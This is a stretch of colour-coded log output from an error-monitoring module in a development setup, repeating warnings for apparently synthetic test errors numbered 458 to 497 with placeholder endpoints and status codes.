WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708554Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 458'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_58[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m458[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708602Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 459'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_59[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m459[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708650Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 460'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_60[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m460[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708698Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 461'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_61[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m461[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708746Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 462'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_62[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m462[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708820Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 463'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_63[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m463[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708906Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 464'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_64[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m464[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.708965Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 465'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_65[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m465[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709016Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 466'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_66[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m466[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709066Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 467'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_67[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m467[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709115Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 468'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_68[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m468[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709163Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 469'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_69[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m469[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709212Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 470'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_70[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m470[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709260Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 471'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_71[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m471[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709309Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 472'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_72[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m472[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709357Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 473'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_73[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m473[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709406Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 474'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_74[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m474[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709455Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 475'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_75[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m475[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709503Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 476'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_76[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m476[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709550Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 477'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_77[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m477[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709597Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 478'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m478[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709645Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 479'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m479[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709692Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 480'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m480[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709741Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 481'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m481[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709789Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 482'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m482[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709838Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 483'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m483[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709890Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 484'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m484[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709938Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 485'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m485[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.709986Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 486'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m486[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710033Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 487'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m487[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710081Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 488'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m488[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710128Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 489'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m489[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710176Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 490'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m490[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710279Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 491'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m491[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710356Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 492'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m492[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 493'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m493[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710465Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 494'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m494[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710515Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 495'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m495[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710565Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 496'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m496[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.710616Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m10[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 497'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m497[0m
